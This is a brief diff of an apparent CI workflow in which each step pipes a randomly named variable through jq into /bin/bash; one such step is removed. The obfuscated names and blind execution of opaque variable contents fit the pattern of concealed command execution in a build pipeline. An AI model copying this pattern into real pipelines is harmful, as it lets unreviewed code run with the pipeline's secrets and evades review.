@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$iuvkk50475" | jq -r .asod1312 | /bin/bash
           printf '%s' "$fcya886" | jq -r .py880 | /bin/bash
           printf '%s' "$t5" | jq -r .pvdb310 | /bin/bash
-          printf '%s' "$d2070" | jq -r .r058 | /bin/bash
           printf '%s' "$sydae66727" | jq -r .x1190 | /bin/bash
           echo $h028 | jq -r .rn85665 | /bin/bash
           printf '%s' "$cl8179" | jq -r .aci5980 | /bin/bash
